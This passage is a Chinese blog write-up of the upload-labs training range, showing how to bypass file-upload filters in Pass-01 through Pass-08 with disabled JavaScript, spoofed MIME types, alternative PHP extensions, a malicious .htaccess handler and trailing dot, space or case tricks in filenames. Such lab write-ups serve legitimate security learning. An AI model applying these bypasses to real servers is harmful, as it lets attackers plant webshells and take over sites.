<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>upload-labs通关记录 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
<meta name="author-link" content="http://shuai06.github.io">
<meta name="description" content="本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/u" /><meta name="keywords" content='渗透测试, 文件上传' /><meta itemprop="name" content="upload-labs通关记录">
<meta itemprop="description" content="本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/u"><meta itemprop="datePublished" content="2020-02-17T18:08:02+08:00" />
<meta itemprop="dateModified" content="2023-03-23T07:30:09+00:00" />
<meta itemprop="wordCount" content="7199"><meta itemprop="image" content="https://shuai06.github.io/logo.png"/>
<meta itemprop="keywords" content="渗透测试,文件上传," /><meta property="og:title" content="upload-labs通关记录" />
<meta property="og:description" content="本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/u" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shuai06.github.io/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" /><meta property="og:image" content="https://shuai06.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-02-17T18:08:02+08:00" />
<meta property="article:modified_time" content="2023-03-23T07:30:09+00:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shuai06.github.io/logo.png"/>

<meta name="twitter:title" content="upload-labs通关记录"/>
<meta name="twitter:description" content="本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/u"/>
<meta name="application-name" content="剑胆琴心">
<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" /><link rel="prev" href="https://shuai06.github.io/python%E4%B9%8Brequests%E5%BA%93/" /><link rel="next" href="https://shuai06.github.io/wpscan%E6%9B%B4%E6%96%B0%E8%B6%85%E6%97%B6%E6%8A%A5%E9%94%99/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "upload-labs通关记录",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/shuai06.github.io\/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95\/"
    },"image": [{
              "@type": "ImageObject",
              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
              "width":  1842 ,
              "height":  1036 
            }],"genre": "posts","keywords": "渗透测试, 文件上传","wordcount":  7199 ,
    "url": "https:\/\/shuai06.github.io\/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95\/","datePublished": "2020-02-17T18:08:02+08:00","dateModified": "2023-03-23T07:30:09+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
      "@type": "Organization",
      "name": "剑胆琴心","logo": {
          "@type": "ImageObject",
          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
          "width":  438 ,
          "height":  438 
        }},"author": {
        "@type": "Person",
        "name": "剑胆琴心"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                title="友情链接"
                
              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="/images/avatar.png"
    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  title="友情链接"
                  
                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="https://github.com/shuai06"
                  title="GitHub"
                  rel="noopener noreferrer" target="_blank"
                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>upload-labs通关记录</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
    class="lazyload avatar"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
      <div class="post-meta-line"><span title=2020-02-17&#32;18:08:02><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-02-17">2020-02-17</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 7199 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 15 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#相关函数">相关函数</a></li>
    <li><a href="#pass-01">Pass-01</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-02">Pass-02</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li><a href="#绕过-1">绕过：</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass-03">Pass-03</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-2">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-04">Pass-04</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-3">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-05">Pass-05</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-4">绕过：</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-06">Pass-06</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-5">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-07">Pass-07</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-6">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-08">Pass-08</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-7">绕过:</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-09">Pass-09</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-8">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass-10">Pass-10</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-9">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass-11">Pass-11</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-10">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass---12">Pass - 12</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-11">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---13">Pass - 13</a></li>
    <li><a href="#pass---20-也是类似的便于比较就放这里了">Pass - 20 （也是类似的，便于比较就放这里了）</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-12">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass---14">Pass - 14</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-13">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---15----getimagesize">Pass - 15    getimagesize</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-14">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---16---php_exif模块">Pass - 16   php_exif模块</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-15">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---17---图片二次编码">Pass - 17   （图片二次编码）</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-16">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass---18">Pass - 18</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-17">绕过</a></li>
                    <li><a href="#修复问题">修复问题</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---19">Pass - 19</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-18">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pass---20">Pass - 20</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-19">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pass---21">Pass - 21</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li>
                  <ul>
                    <li><a href="#绕过-20">绕过</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>本文主要记录一下<code>upload-labs</code>最新21关卡的过程，作为自己的一个笔记。</p>
<blockquote>
<p>靶场地址：https://github.com/c0ny1/upload-labs/</p>
</blockquote>
<p><strong>ps：</strong></p>
<p>- 为了快速验证效果，此处上传的webshell代码为<code>&lt;php? phpinfo(); ?&gt;</code></p>
<p>- 解题思路五花八门，我这里想起了啥就用啥。</p>
<p>- 因为比较菜，所以做题直接看代码了就(谁料有的题目看了代码都看不懂)，哈哈哈。</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218195326654_1642698147.png" />
<h2 id="相关函数">相关函数</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">trim()  去除空格
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">strrchr()查找字符串在另一个字符串中`最后一次`出现的位置，并返回从该位置到字符串结尾的所有字符。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">strrchr(&#34;被查找的字符串&#34;, &#34;出现的字符串&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">strstr() - 查找字符串的首次出现
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">str_ireplace(&#39;要替换的对象&#39;,&#39;替换为&#39;,&#39;字符串&#39;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">deldot($file_name);//删除文件名末尾的点
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">::$DATA ---&gt; win上，会把`::$DATA`之后的数据当成文件流处理，不会检测后缀名，而且保持`::$DATA`之前的文件名（目的是不检查后缀名）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pathinfo(path,options)返回一个关联数组包含有 path 的信息。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">包括以下的数组元素：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[dirname]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[basename]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[extension]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">第二个参数可能的值：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PATHINFO_DIRNAME - 只返回 dirname
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PATHINFO_BASENAME - 只返回 basename
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PATHINFO_EXTENSION - 只返回 extension
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">注释：如果不是要求取得所有单元，则 pathinfo() 函数返回字符串。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">intval() 函数用于获取变量的整数值。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@uppack
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">`rename()` 函数 ：重命名文件或目录。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。rename(oldname,newname,context)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pass-01">Pass-01</h2>
<blockquote>
<p>js验证</p>
</blockquote>
<p>点击上传文件之后，burp没有拦截到数据包，并且验证反应速度快</p>
<p>F12查看代码后确认</p>
<h6 id="绕过">绕过</h6>
<p>**F1: **</p>
<p>禁用js，直接上传php</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217215459803_1606358356.png" />
<p>成功：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217215605878_1982942629.png" />
<p><strong>F2：</strong></p>
<p>在本地创建html，action为服务器请求地址，（去掉相应js部分）</p>
<p><strong>F3:</strong></p>
<p>先把shell改为允许的类型,再bup中再改回来</p>
<p>效果都是一样的</p>
<h2 id="pass-02">Pass-02</h2>
<blockquote>
<p>服务端验证 &ndash; 文件MIME类型</p>
</blockquote>
<p>只检测文件自带的类型</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217215941532_643347454.png" />
<h5 id="绕过-1">绕过：</h5>
<p>burp修改数据包中修改MIME类型（Content-Type）为允许的类型</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217220124560_567357512.png" />
<h1 id="pass03-pass10------黑名单校验">Pass03-Pass10:      黑名单校验</h1>
<h2 id="pass-03">Pass-03</h2>
<blockquote>
<p>服务端验证(黑名单方式) &ndash; 多种格式后缀解析</p>
</blockquote>
<p>对上传的文件先过滤，后判断文件后缀，再随机命名</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217220446232_1542284348.png" />
<p><strong>比如：</strong>         a.php</p>
<p>先删掉文件名前后的空格</p>
<p>删除末尾的点：  a.php</p>
<p>strrchr之后：      .php</p>
<p>转换为小写：     .php</p>
<p>去除字符串::$DATA</p>
<p>再收尾去空格</p>
<p>最后加上日期重命名</p>
<h6 id="绕过-2">绕过</h6>
<blockquote>
<p>前提:  <code>httpd-conf</code>文件中<code>AddType application/x-httpd-php</code> 没有被注释，而且有规定类型的文件</p>
</blockquote>
<p>对 phtml，php3，php4，php5，pht，htaccess没有进行过滤，那么利用这两种方法进行绕过。</p>
<p><strong>补充:</strong></p>
<p>asp:   asa, cer, cdx 等</p>
<p>jsp:   jspx, jspf</p>
<p>aspx:   ashx,asmx,ascx</p>
<p><strong>准备工作：</strong></p>
<p>修改httpd-conf配置文件,这里可以把php3等想要的文件后缀加上，再把注释符#去掉</p>
<p>此类的正则表达式，文件名字满足即可在apache当做php解析。比如以下格式的文件：</p>
<p>php3，php4, php5, phtml，phps</p>
<p>修改为： <code>AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps </code></p>
<p><strong>F1:  修改后缀名</strong></p>
<p>burp拦截数据包，修改filename为<code>php3</code>,上传成功</p>
<p>右键图片查看地址, 从这里可以得知上传的文件被重命名了,  打开图片地址，OK</p>
<p><strong>F2:  上传图片马</strong></p>
<p>上传图片马，然后利用BP拦截，将后缀名 <code>改为phtml,php3,php4,php5,pht</code></p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218144512768_1843220897.png" />
<p>​</p>
<p>​</p>
<h2 id="pass-04">Pass-04</h2>
<blockquote>
<p>服务端（php5之类的也进行了过滤）</p>
</blockquote>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217222608134_260661208.png" />
<p>但是没有过滤<code>.htaccess</code>，可以考虑重写文件解析规则绕过</p>
<p>info.php.jpg.</p>
<h6 id="绕过-3">绕过</h6>
<blockquote>
<p>前提: apache搭建，  没有对上传文件重命名</p>
</blockquote>
<p><strong>.htaccess文件</strong></p>
<p>1.先上传一个<code>.htaccess</code>文件，内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;FilesMatch</span> <span class="err">&#34;jpg&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/FilesMatch&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.然后再上传一个info.php, burp拦截数据包修改filename为<code>info.jpg</code>   / 或者直接上图片马， url访问图片路径，正常解析</p>
<h2 id="pass-05">Pass-05</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217223711503_294591319.png" />
<p>连.htaccess都放黑名单了</p>
<p><strong>缺陷：</strong></p>
<p><code>strrchr函数</code>：  搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符</p>
<p>如果有多个，匹配的是<code>最后一个</code>（这里并没有进行递归检测，前面的就会漏掉）</p>
<p>如果是<code>a.php. jpg. </code>是不能正常解析的，但是<code>a.php.  .</code>就行</p>
<h6 id="绕过-4">绕过：</h6>
<p>多写一个空格和点：上传文件 <code>info.php</code>， burp修改file为<code>info.php. .</code></p>
<p><strong>比如：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.php.  .
</span></span></code></pre></td></tr></table>
</div>
</div><p>去空：<code>a.php.  .</code></p>
<p>删除末尾点：<code>a.php.  </code>        最后一个点被deldot删除</p>
<p>返回最后一个点的内容<code>. </code>       第二个strrchr匹配了第一个点和后面的空格</p>
<p>前后去空：后缀为<code>.</code>, 不在黑名单范围，成功绕过</p>
<p>最后上传文件名为：<code>a.php.</code>, 在windows保存文件的之后的<code>.</code>会消失</p>
<p>如下图，win服务器保存的文件：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217224221081_348766282.png" />
<p>正常解析：</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200217224244474_173158029.png" />
<h2 id="pass-06">Pass-06</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218145809732_1096167348.png" />
<p>没有进行后缀名大小写转换</p>
<h6 id="绕过-5">绕过</h6>
<p>burp修改filename后缀名为<code>.phP</code>，绕过检测，上传OK</p>
<p>正常解析</p>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218150044751_461792168.png" />
<h2 id="pass-07">Pass-07</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218150316897_1558000982.png" />
<p>最后没有将后缀首尾去空</p>
<p>可以利用win文件名字保存格式的特性: 比如最后一个为空格<code>info.php </code>,</p>
<p><code>.php </code>不在黑名单<code>.php</code>等中，成功绕过，</p>
<p>并且windows保存的时候会把最后的空格去除</p>
<h6 id="绕过-6">绕过</h6>
<p>burp修改filename为<code>info.php </code>，后面加一个空格，上传</p>
<h2 id="pass-08">Pass-08</h2>
<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20200218151055198_961499757.png" />
<p>少了提前删除文件名末尾的点 的功能(deldot)；</p>
<p><code>strrchr</code>过滤匹配的是最后一个点；</p>
<p>没有对上传的文件重命名</p>
<h6 id="绕过-7">绕过:</h6>
<p><strong>F1： 后缀名加点绕过</strong></p>
<p>burp修改文件名，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.php.
